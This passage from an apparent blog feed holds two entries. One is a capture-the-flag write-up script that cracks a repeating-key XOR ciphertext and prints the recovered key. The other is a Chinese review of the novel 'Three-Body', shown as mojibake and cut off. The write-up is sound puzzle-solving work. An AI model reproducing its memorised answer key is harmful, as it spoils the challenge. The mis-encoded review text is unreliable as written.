class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">ps=<span class="string">'1234567890qwertyuiopasdfghjklxcvbnmQWERTYUIOPSDFGHJKLZXCVBNM\'` ;,.'</span></span><br><span class="line">ks=<span class="string">'1234567890qwertyuiopasdfghjklxcvbnmQWERTYUIOPSDFGHJKLZXCVBNM'</span></span><br><span class="line">res=<span class="string">'1e5d4c055104471c6f234f5501555b5a014e5d001c2a54470555064c443e235b4c0e590356542a130a4242335a47551a590a136f1d5d4d440b0956773613180b5f184015210e4f541c075a47064e5f001e2a4f711844430c473e2413011a100556153d1e4f45061441151901470a196f035b0c4443185b322e130806431d5a072a46385901555c5b550a541c1a2600564d5f054c453e32444c0a434d43182a0b1c540a55415a550a5e1b0f613a5c1f10021e56773a5a0206100852063c4a18581a1d15411d17111b052113460850104c472239564c0755015a13271e0a55553b5a47551a54010e2a06130b5506005a393013180c100f52072a4a1b5e1b165d50064e411d0521111f235f114c47362447094f10035c066f19025402191915110b4206182a544702100109133e394505175509671b6f0b01484e06505b061b50034a2911521e44431b5a233f13180b5508131523050154403740415503484f0c2602564d470a18407b775d031110004a54290319544e06505b060b424f092e1a770443101952333213030d554d551b2006064206555d50141c454f0c3d1b5e4d43061e453e39544c17580856581802001102105443101d111a043c03521455074c473f3213000a5b085d113c194f5e08555415180f5f433e270d131d420c1957773f560d11440d40543c060e470b55545b114e470e193c155f4d47110947343f13180c100f565a000403484e184c15050250081f2a54470545104c5536251325435302461a3b4a02484e12545c1b4265070b3b5440055543185b36231301025b084054220f4f42071b1554020f430b196f19564d4002055d79'</span><span class="comment">#res=salt^output</span></span><br><span class="line">trlen= int(len(res)/<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">list1=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(res),<span class="number">2</span>):</span><br><span class="line">    list1.append(res[i:i+<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">list2=[]                 <span class="comment">#åˆ—å‡ºkeyå…¨é›†</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,trlen):</span><br><span class="line"></span><br><span class="line">    list3=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ks:</span><br><span class="line">        <span class="keyword">if</span> (chr(ord(i)^int(list1[j],<span class="number">16</span>))<span class="keyword">in</span> ps):</span><br><span class="line">            list3.append(i)</span><br><span class="line">    list2.append(list3)             </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">                                      </span><br><span class="line"></span><br><span class="line">                     </span><br><span class="line"><span class="keyword">for</span> length <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">38</span>):          <span class="comment">#æ ¹æ®key[0]ä¸ä¸ºç©ºé›†æ¥çˆ†length</span></span><br><span class="line">    x=set(list2[<span class="number">0</span>]) </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,trlen,length):</span><br><span class="line">        x &amp;= set(list2[j])</span><br><span class="line">    <span class="keyword">if</span> len(x)!=<span class="number">0</span>:</span><br><span class="line">        print(length)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">y = []</span><br><span class="line"><span class="keyword">for</span> z <span class="keyword">in</span> range(<span class="number">30</span>):          <span class="comment">#çˆ†keyå€™é€‰é›†</span></span><br><span class="line">    x=set(list2[z]) </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(z,trlen,<span class="number">30</span>):</span><br><span class="line">        x &amp;= set(list2[j])</span><br><span class="line">    <span class="keyword">if</span> len(x)!=<span class="number">0</span>:</span><br><span class="line">        y.append(x)</span><br><span class="line">print(str(y).replace(<span class="string">"&#125;,"</span>,<span class="string">"&#125;,\n"</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key=<span class="string">'W3lc0m3tOjo1nu55un1ojOt3m0cl3W'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ki=cycle(key)           <span class="comment">#çœ‹ç»“æœ</span></span><br><span class="line">str1=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> list1:</span><br><span class="line">    str1+=chr(ord(next(ki))^int(each,<span class="number">16</span>))</span><br><span class="line">print(str1)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›å°å±‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write Up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸‰ä½“</title>
      <link href="/2019/08/02/%E4%B8%89%E4%BD%93/"/>
      <url>/2019/08/02/%E4%B8%89%E4%BD%93/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸‰ä½“"><a href="#ä¸‰ä½“" class="headerlink" title="ä¸‰ä½“"></a>ä¸‰ä½“</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><img src="https://i.loli.net/2020/04/30/xBa2G13zq4LgNuR.png" alt="ä¸‰ä½“"></p><p>è¿™ä¸ªæš‘å‡ï¼Œè¯»äº†ä¸‰ä½“ä¸€ä¹¦ã€‚</p><p>&emsp;&emsp;ç²—æµ…çš„ç”¨ä¸€å¥è¯æ¦‚æ‹¬ä¸‰ä½“è¿™å¥—ä¹¦ï¼Œä¸‰ä½“äººæƒ³è¦ä¾µç•¥åœ°çƒï¼Œäººç±»è·Ÿä»–ä¸«æ­»ç£•ã€‚</p><p>&emsp;&emsp;æ•…äº‹æƒ…èŠ‚è·Œå®•èµ·ä¼ï¼Œå‹¾äººå¿ƒå¼¦ï¼Œä½†ä¸‰ä½“ä»¤äººç€è¿·çš„åœ°æ–¹ï¼Œä¸å•å•åªæ˜¯å› ä¸ºä»–æœ‰ä¸€ä¸ªå¥½æ•…äº‹ï¼Œæ›´å¸å¼•äººçš„åœ°æ–¹ï¼Œæ˜¯ä»–è¿˜æ‹¥æœ‰å‘äººæ·±æ€çš„é­”åŠ›ã€‚</p><h3 id="ä¸‰ä½“-1"><a href="#ä¸‰ä½“-1" class="headerlink" title="ä¸‰ä½“"></a>ä¸‰ä½“</h3><p>&emsp;&emsp;æ•…äº‹æ˜¯ç”±ä¸‰ä½“äººå’Œäººç±»ä¸­ä¸¤ä¸ªé»˜é»˜æ— é—»çš„äººå¼•å‘çš„ã€‚åˆ†åˆ«æ˜¯ä¸‰ä½“äºº1379å·å’Œåœ°çƒäººå¶æ–‡æ´ã€‚æ•…äº‹å…ˆä»ä¸‰ä½“äººçš„åŸºæœ¬æƒ…å†µè¯´èµ·ã€‚ä¸‰ä½“äººå±…ä¸­åœ¨è·ç¦»åœ°çƒ4.3å…‰å¹´å¤–ï¼Œå’Œäººç±»æ˜¯éå¸¸è¿‘çš„é‚»å±…ã€‚ä»–ä»¬å±…ä½çš„æ˜Ÿçƒéå¸¸å‘ï¼Œå› ä¸ºå¼•åŠ›ä½œç”¨ï¼Œä¸‰ä½“æ˜Ÿçƒä¼šè¢«æ‹‰æ¥æ‹‰å»ï¼Œè¿™ä¼šå¯¼è‡´ï¼Œè¿™é¢—æ˜Ÿçƒæœ‰æ—¶å€™ç‰¹åˆ«å†·ï¼Œæœ‰æ—¶å€™ç‰¹åˆ«çƒ­ã€‚åªæœ‰åœ¨è·ç¦»åˆšåˆšå¥½çš„æ—¶å€™ï¼Œä¸‰ä½“æ–‡æ˜æ‰ä¼šè“¬å‹ƒå‘å±•ã€‚è¿˜æœ‰ä¸€ç§æç«¯çš„æƒ…å†µï¼Œè¿™é¢—æ˜Ÿçƒä¼šè¢«ä¸‰ä½“çš„å¼•åŠ›æ’•è£‚ï¼Œé‚£ä¹ˆä¸‰ä½“æ–‡æ˜å°±å½»åº•ç»“æŸäº†ã€‚ä¸‰ä½“äººæ‰€é¢ä¸´çš„é—®é¢˜ï¼Œä¾¿æ˜¯æ•°å­¦ä¸Šéå¸¸ç»å…¸çš„ä¸‰ä½“é—®é¢˜ï¼Œå°è¯´åå­—ä¹Ÿæ˜¯ç”±æ­¤è€Œæ¥ã€‚å› ä¸ºä¸‰ä½“é—®é¢˜ï¼Œä¸‰ä½“äººæ²¡æœ‰åŠæ³•å¯¹æœªæ¥è¿›è¡Œå‡†ç¡®çš„é¢„æµ‹ã€‚åƒå’±ä»¬äººç±»éƒ½ä¹ æƒ¯äº†ç¬¬äºŒå¤©æ—©ä¸Šå¤ªé˜³ä¼šå‡èµ·æ¥ï¼Œä½†ä¸‰ä½“äººå¯å°±æ²¡é‚£ä¹ˆå¥½å‘½ï¼Œç¬¬äºŒå¤©å¤ªé˜³æ˜¯å¦ä¼šå‡èµ·æ¥ï¼Œå“ªä¸ªä¸‰ä½“äººéƒ½ä¸çŸ¥é“ã€‚åœ¨è¿™ç§ç¯å¢ƒä¸‹ï¼Œä¸‰ä½“äººè¿˜è¿›åŒ–å‡ºäº†ä¸€ç§è„±æ°´çš„èƒ½åŠ›ï¼Œä»¥ä¾¿åœ¨æ¶åŠ£çš„ç¯å¢ƒä¸­ä¼‘çœ ï¼Œæ­£æ‰€è°“ç”Ÿäºå¿§æ‚£è€Œæ­»äºå®‰ä¹ï¼Œä¸‰ä½“äººç–¯ç‹‚çš„å‘å±•ç§‘æŠ€ï¼Œæƒ³æ‰¾åˆ°ä¸€ä¸ªé è°±çš„æ˜Ÿçƒï¼Œå°±åƒåœ°çƒé‚£æ ·ï¼Œå¯ä»¥åœ¨é‚£é‡Œç”Ÿæ´»ï¼Œå› æ­¤ä¸‰ä½“äººæŠ•å…¥äº†å¤§é‡çš„äººåŠ›ç‰©åŠ›ï¼Œå¤©å¤©ä»”ç»†ç›‘å¬å®‡å®™é‡Œçš„å„ç§ä¿¡å·ï¼Œä¸æƒ³æ”¾è¿‡ä¸€ä¸èƒ½æ‰¾åˆ°æ–°å®¶å›­çš„æœºä¼šã€‚</p><p>&emsp;&emsp;æ¥ä¸‹æ¥æ˜¯å¶æ–‡æ´ï¼Œå°±æ˜¯å¥¹æŠŠä¸‰ä½“äººå¼•è¿‡æ¥çš„ã€‚å¶æ–‡æ´æ˜¯ä¸€å¯¹ä¸­å›½ç§‘å­¦å®¶å¤«å¦»çš„å¥³å„¿ï¼Œå°æ—¥å­è¿‡å¾—å¾ˆå¹¸ç¦ã€‚ä½†å¥¹çš„çˆ¶äº²åœ¨æ–‡é©æœŸé—´ç”±äºä¸æ„¿æ„è¯´è°è®¤ç½ªï¼Œè¢«å››ä¸ªéƒ½æ˜¯ä¸­å­¦ç”Ÿçš„å¥³çº¢å«å…µï¼Œç”¨æ­¦è£…çš®å¸¦å½“ä¼—æŠ½æ‰“è‡´æ­»ï¼›æ¯äº²åœ¨æ–‡é©ä¸­ä¹Ÿç–¯äº†ã€‚åæ¥å¶æ–‡æ´åŠ å…¥äº†å»ºè®¾å…µå›¢ï¼Œå¥¹äº²çœ¼ç›®ç¹äº†è¿™ç¾¤äººçš„ç–¯ç‹‚ï¼Œå±±æ—è‰åŸéƒ½å˜æˆäº†è’æ¼ ã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œä»–è®¤è¯†äº†ä¸€ä½è®°è€…ï¼Œç™½æ²æ—ï¼ŒäºŒäººæˆä¸ºäº†çŸ¥å·±ã€‚åæ¥è¿™ä½çŸ¥å·±æƒ³è¦ç»™ä¸­å¤®å¯„ä¸€å°ä¿¡ï¼Œåæ˜ å»ºè®¾å…µå›¢ä¸æ˜¯åœ¨å»ºè®¾è€Œæ˜¯åœ¨æ¯åç¯å¢ƒã€‚å¶æ–‡æ´çœ‹äº†ä¿¡åå¤§åŠ èµèµï¼Œæ•´å°ä¿¡å†…å®¹ä¸°å¯Œï¼Œé€»è¾‘ç¼œå¯†ï¼Œä»¤ä»–ä¿¡æœï¼Œä½†è¿™ä¸ªè®°è€…é•¿æœŸå¹²é‡æ´»ï¼Œå¯¼è‡´æ‰‹æŠ–çš„å‰å®³ï¼Œäºæ˜¯å¶æ–‡æ´å°±å¸®çŸ¥å·±é‡æ–°æŠ„äº†ä¸€éï¼Œåæ¥ä¸Šçº§è¿½æŸ¥äº†ä¸‹æ¥ï¼Œè®¤ä¸ºè¿™æ˜¯ååŠ¨çš„è¡Œå¾„ã€‚äºæ˜¯ä¹è¿™ä½çŸ¥å·±ä¾¿å‡ºå–äº†å¶æ–‡æ´ï¼Œè¯´è‡ªå·±å¹¶ä¸çŸ¥é“ä¿¡çš„å†…å®¹ï¼Œè¿™ä¸€ä¸‹å…¨éƒ¨çš„è´£ä»»éƒ½æ¨ç»™äº†å¶æ–‡æ´ï¼Œå¶æ–‡æ´è¢«å…³è¿›äº†çœ‹å®ˆæ‰€ï¼Œåœ¨çœ‹å®ˆæ‰€å¥¹æ‹’ç»ç­¾å­—é™·å®³å¥¹çš„çˆ¶äº²ï¼Œå—åˆ°äº†å˜æœ¬åŠ å‰çš„è¿«å®³ï¼Œè¿™ä¸€åˆ‡çš„ä¸‘æ¶è®©å¥¹å¿ƒä¸­çš„åäººç±»ç§å­é•¿æˆäº†å‚å¤©å¤§æ ‘ã€‚å¯¹äººç±»å½»åº•çš„ç»æœ›äº†ã€‚åæ¥å¶æ–‡æ´çˆ¶äº²çš„å­¦ç”Ÿæ¨ä¼Ÿå®å¾—çŸ¥æ­¤äº‹åï¼Œé€šè¿‡è®©å¥¹å‚ä¸çº¢å²¸åŸºåœ°çš„çº¢å²¸è®¡åˆ’æ•‘å‡ºäº†å¶æ–‡æ´ã€‚</p><p>&emsp;&emsp;çº¢å²¸è®¡åˆ’çš„ä¸»è¦ç›®çš„æ˜¯å¯»æ‰¾å¤–æ˜Ÿäººï¼Œä»¥æ±‚ç§‘æŠ€é£è·ƒï¼Œè¿™ä¸ªè®¡åˆ’éœ€è¦çš„äººæ‰æå…¶è‹›åˆ»ï¼Œä¸è¿‡å¶æ–‡æ´çš„æ¡ä»¶æ­£å¥½ç¬¦åˆï¼Œä½†åŠ å…¥çš„ä»£ä»·æ˜¯æ°¸è¿œç•™åœ¨åŸºåœ°ï¼Œä¸ä¸–éš”ç»ã€‚ç»æœ›çš„å¶æ–‡æ´è¿˜ä¸çŠ¹è±«åœ°ç­”åº”äº†ã€‚å‡ å¹´åï¼Œå¶æ–‡æ´å’Œè¿™ä½çˆ¶äº²çš„å­¦ç”Ÿï¼Œè‡ªå·±çš„æ©äººï¼Œæ¨ä¼Ÿå®ç»„å»ºäº†å®¶åº­ï¼Œç”Ÿäº†ä¸€ä¸ªå¥³å„¿ï¼Œæ¨å†¬ã€‚</p><p>&emsp;&emsp;å·¥ä½œæœŸé—´ï¼Œèªæ˜çš„å¶æ–‡æ´åˆ©ç”¨å¤ªé˜³å¼ºåŒ–å¤©çº¿åŠŸç‡ï¼Œå‘å¤ªç©ºå‘å‡ºäº†åœ°çƒçš„ç¬¬ä¸€å°ä¿¡ï¼Œé‡Œé¢åŒ…å«ç€åœ°çƒæ–‡æ˜çš„åŸºæœ¬ä¿¡æ¯ã€‚è¿™ä¸ªä¿¡å·ï¼Œå¯æ˜¯ä¸‰ä½“äººåšæ¢¦éƒ½åœ¨æ‰¾çš„ï¼Œæ”¶åˆ°å¶æ–‡æ´ä¿¡å·çš„æ˜¯é‚£ä¸ªå«1379å·çš„ä¸‰ä½“äººã€‚ä¸‰ä½“çš„æ–‡æ˜æ˜¯é«˜åº¦é›†æƒçš„ï¼Œå¤„äºæç«¯çš„ä¸“åˆ¶ä¸­ï¼Œå¯¹ä¸ªä½“çš„å°Šé‡å‡ ä¹ä¸å°Šé‡ã€‚æœ‰å¤šä¸å°Šé‡å‘¢ï¼Ÿä¸èƒ½å·¥ä½œçš„äººï¼Œå°±å¾—æ­»ã€‚æ¯•ç«Ÿåœ¨è¿™ç§æ˜Ÿçƒç¯å¢ƒä¸‹ï¼Œé›†æƒæ‰èƒ½å¿«é€Ÿå‘å±•ä¸‰ä½“çš„æ–‡æ˜ã€‚1379å·å­¤ç‹¬åœ°ç”Ÿæ´»äº†å¤§åŠè¾ˆå­ï¼Œ1379å·æ‰€åœ¨çš„ç›‘å¬ç«™ï¼Œå·²ç»æœ‰ä¸Šåƒå¹´çš„å†å²äº†ã€‚è¿™é‡Œåªæœ‰ä»–ä¸€ä¸ªäººï¼Œä»–æ¯å¤©éƒ½åœ¨ä¸€ä¸ªå°æˆ¿å­é‡Œï¼Œä½œè€…ç›‘å¬å®‡å®™ä¿¡å·è¿™ç§æ— èŠåº•å±‚çš„å·¥ä½œã€‚åœ¨ä¸‰ä½“ä¸–ç•Œé‡Œï¼Œè¿™æ˜¯ä¸€ä¸ªå‘å¾®çš„èŒä¸šï¼Œå¤„åœ¨ç¤¾ä¼šçš„æœ€åº•å±‚ï¼Œæ²¡æœ‰äººæ³¨æ„ä»–ï¼Œæ›´æ‚²å‚¬çš„æ˜¯ï¼Œä»–ä¸€è¾ˆå­ä»€ä¹ˆä¹Ÿæ²¡å¬åˆ°ã€‚å‘½è¿æ€»æ˜¯ä¸æœŸè€Œé‡ï¼Œ1379å·æ”¶åˆ°äº†å¶æ–‡æ´çš„ä¿¡å·ï¼Œä»–çœ‹åˆ°ä¿¡æ¯æ—¶éå¸¸æ„ŸåŠ¨ï¼Œæ¯•ç«Ÿä»–ç­‰äº†ä¸€è¾ˆå­ï¼Œä»–é€šè¿‡è‡ªè¯‘è§£ç³»ç»Ÿï¼Œçœ‹æ‡‚äº†å¶æ–‡æ´å‘æ¥çš„ä¿¡æ¯ï¼Œä»–å‘ç°è¿™ä¸ªé¥è¿œçš„æ˜Ÿçƒï¼Œå°±æ˜¯è‡ªå·±æ¢¦ä¸­çš„å¤©å ‚ï¼Œå…¨ä¸‰ä½“äººå¿ƒä¸­ç†æƒ³çš„å®¶å›­ã€‚ä»–ä¸æƒ³æŠŠè¿™ä¸€æ¶ˆæ¯é€šçŸ¥ä¸Šçº§ï¼Œä»–çŸ¥é“è¿™æ„å‘³ç€åœ°çƒä¼šè¢«ä¾µç•¥ï¼Œè€Œä¸”å³ä¾¿ä¸‰ä½“äººæˆåŠŸå é¢†åœ°çƒï¼Œä¹Ÿå’Œä»–æ²¡å…³ç³»ï¼Œå¹¶ä¸”ä¸€æ—¦ä»–å®Œæˆä»»åŠ¡ï¼Œä»–å°†å¾ˆæœ‰å¯èƒ½å¤±å»åœ¨ç¤¾ä¼šä¸­å­˜åœ¨çš„ä»·å€¼ï¼Œä¹Ÿå°±æ˜¯è¯´1379çš„æˆåŠŸï¼Œä¸ä¼šæ”¹å˜ä»–å­¤ç‹¬è€Œå‘å¾®çš„ç”Ÿæ´»ï¼Œè¯´ä¸å®šè¿˜ä¼šæ›´ç³Ÿã€‚æ¸æ¸åœ°ä»–çˆ±ä¸Šäº†è¿™é¢—é¥è¿œçš„ç¾ä¸½æ˜Ÿçƒï¼Œäºæ˜¯ä»–ç»™å¶æ–‡æ´å›å¤äº†è¿™ä¹ˆä¸€æ®µä¿¡æ¯ï¼Œä¸è¦å›ç­”ï¼Œä¸è¦å›ç­”ï¼Œä¸è¦å›ç­”ã€‚åé¢è¿˜æœ‰ä¸€æ®µä¿¡æ¯ï¼Œå¤§è‡´å†…å®¹å¦‚ä¸‹ï¼šæˆ‘æ˜¯ä¸€ä¸ªå’Œå¹³ä¸»ä¹‰è€…ï¼Œæˆ‘ä¸çŸ¥é“ä½ æ˜¯è°ï¼Œåœ¨ä½ çš„ä¿¡å·æ¥æºçš„æ–¹å‘ï¼Œæ˜¯æœ‰æ— æ•°é¢—è¡Œæ˜Ÿçš„ã€‚æˆ‘ä»¬æ— æ³•ç¡®å®šä½ ä»¬çš„ä½ç½®ï¼Œä½†åªè¦ä½ å›å¤ï¼Œæˆ‘ä»¬ä¸€å®šä¼šæ‰¾åˆ°ä½ ä»¬ï¼Œæˆ‘ä»¬ä¸€å®šä¼šä¾µç•¥åœ°çƒã€‚è¿™ä¸€æ¡ä¿¡æ¯ï¼Œç›¸å½“äºæŠŠä¸‰ä½“äººåƒå¹´ç­‰ä¸€å›çš„æœºä¼šç»™æ”¾å¼ƒäº†ã€‚è¿™æ¡ä¿¡æ¯ä¸€å‘å‡ºå»ï¼Œ1379é©¬ä¸Šå°±ç»™æŠ“ä½äº†ï¼Œç”±äº1379å·²ç»å¾ˆè€äº†ï¼Œå…ƒé¦–ç»™äº†ä»–è‡ªç”±ï¼Œæƒ³è®©ä»–æ´»åˆ°åœ°çƒå¤±å»ä¸€åˆ‡å¸Œæœ›çš„é‚£ä¸€å¤©ï¼Œè®©å®ƒç¾ç¾æ¢¦ç ´è£‚ï¼Œè¿™å«æ€äººè¯›å¿ƒã€‚ä¸æ­¤åŒæ—¶ï¼Œå…ƒé¦–ä¸‹ä»¤ï¼Œå¤„æ­»ä¸æ­¤ç›¸å…³çš„å…¶ä½™å…­åƒä½ä¸‰ä½“äººã€‚</p><p>&emsp;&emsp;å¶æ–‡æ´æ”¶åˆ°å¤–æ˜Ÿäººçš„å›å¤åï¼ŒæƒŠè®¶ä¸å·²ï¼Œå¿ƒè·³åŠ é€Ÿï¼Œå·²ç»æ— æ³•å†·é™æ€è€ƒçš„å¥¹ï¼Œå¥¹è®¤ä¸ºäººç±»å·²ç»æ²¡å¸Œæœ›äº†ï¼Œæ‰€ä»¥ä»–æƒ³é€šè¿‡ä¸‰ä½“äººè¿™ä¸ªå¤–åŠ›ï¼Œæ¥å¸®åŠ©äººç±»ã€‚ä¾¿å›å¤äº†ï¼šæ¥å§æ¥å¸®åŠ©æˆ‘ä»¬å§ï¼Œæ¥ä¾µç•¥æˆ‘ä»¬å§ï¼Œæˆ‘æ¥å¸®ä½ ä»¬è·å¾—åœ°çƒã€‚ä¸ä¹…åï¼Œå¶æ–‡æ´çš„ä¸Šçº§å‘ç°äº†å“ªé‡Œä¸å¯¹ï¼ŒçŸ¥é“äº†ä»–æ˜¯åœ¨å’Œå¤–æ˜Ÿäººè”ç³»ã€‚å½“é‚£ä½ä¸Šçº§å»æ‚¬å´–ä¸‹é¢æ£€æŸ¥ä»ªå™¨çš„æ—¶å€™ï¼Œå¶æ–‡æ´ä¸ºäº†ä¿è¯ç§˜å¯†ä¸è¢«æ³„éœ²ï¼Œå†·é™æ·¡å®šçš„é”¯æ–­äº†ç»³ç´¢ï¼Œå¯¼è‡´é¢†å¯¼å å´–èº«äº¡ï¼Œæå¸¦ç€æŠŠè‡ªå·±è€å…¬ä¹Ÿæ€äº†ã€‚åæ¥è¿™ä¸ªå å´–äº‹ä»¶ï¼Œè¢«å½“åšæ™®é€šçš„å·¥ä½œäº‹æ•…å¤„ç†äº†ï¼Œæ²¡äººå¯¹å¶æ–‡æ´èµ·ç–‘å¿ƒã€‚é”¯æ–­ç»³å­çš„é‚£ä¸€åˆ»ï¼Œå¶æ–‡æ´å°±å·²ç»ä¸‹å®šå†³å¿ƒï¼Œä»ä»Šå„¿èµ·ï¼Œè€å¨˜å°±è¦æŠŠé©å‘½çš„äº‹ä¸šè¿›è¡Œåˆ°åº•ã€‚</p><p>&emsp;&emsp;ä¸‰ä½“äººé‚£è¾¹ï¼Œ1379åˆšæ£ä¹±å°±è¢«æŠ“äº†ï¼Œä½†å¶æ–‡æ´å›å¤æ—¶å´æ²¡äººçŸ¥é“ã€‚å¥¹å°±åœ¨è¿™ç§æ²¡äººç›´æ¥å¹²é¢„çš„æƒ…å†µä¸‹ï¼Œä¸ºå…¨äººç±»ä¹Ÿåšäº†ä¸ªè¦å‘½çš„å†³å®šã€‚å¶æ–‡æ´è¿™æ¡ä¿¡æ¯ï¼Œé£äº†å››å¹´åˆ°è¾¾äº†ä¸‰ä½“æ˜Ÿçƒï¼Œä¸‰ä½“äººå¯¹è¿™çªå¦‚å…¶æ¥çš„å¹¸è¿ï¼Œæ„Ÿåˆ°æ— æ¯”å¹¸ç¦ã€‚æ¯•ç«Ÿåœ°çƒç¦»å¾—è¿™ä¹ˆè¿‘ï¼Œäºæ˜¯ä¸‰ä½“äººæŠŠæ‰€æœ‰èµ„æºéƒ½ç”¨åœ¨äº†é€ é£èˆ¹ä¸Šï¼Œä¹‹åä¸‰ä½“äººè”ç³»ä¸Šå¶æ–‡æ´ï¼Œè¯·å¥¹åšå¥½æ¥åº”å·¥ä½œï¼Œè¿™ä¸€éƒ¨åˆ†å°±æ˜¯æ•´ä¸ªæ•…äº‹çš„å¼€ç«¯ã€‚</p><p>&emsp;&emsp;1379å’Œå¶æ–‡æ´è¿™ä¸¤ä¸ªæ— åå°å’ï¼Œä¸€ä¸ªå·®ç‚¹è®©ä¸‰ä½“äººå¯¹ç”Ÿå­˜çš„æœºä¼šå¤±ä¹‹äº¤è‡‚ï¼Œè€Œå¦ä¸€ä¸ªç»™å…¨äººç±»å¸¦æ¥äº†å‡ ç™¾å¹´çš„å™©æ¢¦ï¼Œåœ¨ä»¥å‰ä¿¡æ¯é—­å¡çš„æ—¶ä»£ï¼Œæ²¡æœ‰æƒåŠ¿çš„æ— åå°å’ï¼Œæ˜¯ä¸å¯èƒ½å½±å“æ•´ä¸ªä¸–ç•Œæ–‡æ˜çš„ã€‚ä½†å¦‚ä»Šè¿™ä¿©äººèŠç€å¤©ï¼Œå°±æŠŠå„è‡ªæ˜Ÿçƒçš„æ–‡æ˜ï¼Œç¿»æ¥è¦†å»æ”¹å˜äº†ä¸¤æ¬¡ã€‚è¿™é‡Œè­¦ç¤ºäº†æˆ‘ä»¬ï¼Œè®©å¤–æ˜ŸäººçŸ¥é“æˆ‘ä»¬åœ¨å“ªï¼Œæ˜¯ä¸€ä»¶ç‰¹åˆ«ä¸ç€è°ƒçš„äº‹ã€‚éœé‡‘åœ¨ä¹‹å‰ä¹Ÿè¯´äº†å‡ ä¹ä¸€æ ·çš„è§‚ç‚¹ï¼Œåƒä¸‡åˆ«è·Ÿå¤–æ˜Ÿäººçè”ç³»ã€‚</p><p>&emsp;&emsp;æ–‡é©è¿‡å»äº†ï¼Œå¶æ–‡æ´ç»ˆäºå¾—ä»¥å¹³åï¼Œèµ°å‡ºäº†æ·±å±±ï¼Œå¹¶ä¸”å¯ä»¥å›åˆ°æ¯æ ¡ä»»æ•™ã€‚ç”±äºèµ„å†æ·±ï¼Œå¶æ–‡æ´è¢«é€‰ä¸­å»è´Ÿè´£å‘å°„åŸºåœ°çš„é€‰å€é¡¹ç›®ã€‚å¥¹åœ¨è¥¿åŒ—åœ°åŒºè®¤è¯†äº†ä¸€ä¸ªçƒ­çˆ±å¤§è‡ªç„¶çš„å›½å¤–å¯ŒäºŒä»£ä¼Šæ–‡æ€ï¼Œä¼Šæ–‡æ€ä¹Ÿæ˜¯åæ¥åœ¨åœ°çƒæ¥åº”ä¸‰ä½“äººçœŸæ­£è´Ÿè´£äººã€‚ä»–è™½ç„¶å¯Œç”²ä¸€æ–¹ï¼Œä½†ä»–ä¾ç„¶æ”¹å˜ä¸äº†äººä»¬å¯¹åœ°çƒç¯å¢ƒçš„ç ´åï¼Œä»–ä¸€æ ·æœŸæœ›ç€é€šè¿‡å¤–æ˜Ÿäººçš„åŠ›é‡æ¥å¸®åŠ©äººç±»ï¼Œäºæ˜¯ä¼Šæ–‡æ€å’Œå¶æ–‡æ´å†³å®šæºæ‰‹å…±åˆ›è¾‰ç…Œï¼Œä¸¤äººæˆä¸ºäº†åœ°çƒä¸Šä¸‰ä½“ç»„ç»‡çš„åˆ›å§‹äººã€‚ä»–ä»¬ç›¸äº’è¡¨è¾¾æ•¬æ„ï¼Œä¼Šæ–‡æ€è¯´å‡ºäº†ä»¥åï¼Œåœ°çƒä¸‰ä½“ç»„ç»‡æ¥çº³æ–°æˆå‘˜æ—¶å¿…è¯´çš„ä¸€å¥è¯ï¼Œæˆ‘ä»¬æ˜¯åŒå¿—äº†ã€‚</p><p>&emsp;&emsp;å¤šå¹´è¿‡åä¼Šæ–‡æ€åœ¨ç§˜å¯†åœ°åœ¨ä¸€è‰˜å·¨è½®ä¸Šï¼Œåˆ›ç«‹äº†ç¬¬äºŒçº¢å²¸åŸºåœ°ï¼Œåœ¨å·¨è½®ä¸Šå»ºç«‹æ˜¯ä¸ºäº†æ–¹ä¾¿ç§»åŠ¨ä¾¿äºéšè—ã€‚æ ¹æ®å¶æ–‡æ´æä¾›çš„ä¿¡æ¯ï¼Œä¼Šæ–‡æ€ä¸ä¸‰ä½“äººå»ºç«‹äº†é€šè®¯ï¼Œè¿™é‡Œçš„äººå°†å¶æ–‡æ´ç§°ä¹‹ä¸ºæœ€é«˜ç»Ÿå¸…ï¼Œè¿™ä¸ªåäººç±»çš„ç»„ç»‡ï¼Œç›®çš„å¾ˆæ˜ç¡®ï¼Œæ¶ˆç­äººç±»æš´æ”¿ï¼Œä¸–ç•Œå±äºä¸‰ä½“ã€‚</p><p>&emsp;&emsp;ä¸‰ä½“äººæ´¾å‡ºäº†ä¸€ç§å«æ™ºå­çš„ä¸œè¥¿ï¼Œæ¥å°é”åœ°çƒçš„åŸºç¡€ç§‘å­¦ã€‚æ™ºå­æ˜¯ä¸€ä¸ªè¶…çº§å¾®å‹æœºå™¨äººï¼Œå®ƒéå¸¸çš„å°ï¼Œå¯ä»¥è¢«åŠ 